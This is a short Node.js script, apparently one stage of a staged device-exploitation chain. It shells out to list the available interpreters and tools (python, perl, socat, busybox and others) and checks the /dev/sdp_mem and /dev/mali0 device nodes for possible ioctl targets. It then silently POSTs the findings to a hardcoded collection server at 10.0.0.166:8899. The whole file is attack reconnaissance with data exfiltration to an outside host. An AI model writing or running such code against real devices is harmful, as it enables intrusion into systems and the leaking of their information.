// Stage-6 read-only: interpreter availability + sdp_mem ioctl hints.
var fs = require('fs');
var http = require('http');
var cp = require('child_process');
function post(o) {
  var b = JSON.stringify(o);
  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon6', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
  req.on('error', function (e) { });
  req.write(b); req.end();
}
var out = {};
function ex(c) { try { return cp.execSync(c, { timeout: 8000 }).toString(); } catch (e) { return 'ERR ' + e.message; } }
out.which = ex('which python3 python python2 perl lua ruby node sh 2>/dev/null');
out.usrbin = ex('ls /usr/bin /bin 2>/dev/null | grep -iE "python|perl|lua|ruby|node|socat|busybox"');
out.sdp = ex('ls -l /dev/sdp_mem /dev/mali0 2>/dev/null');
post(out);
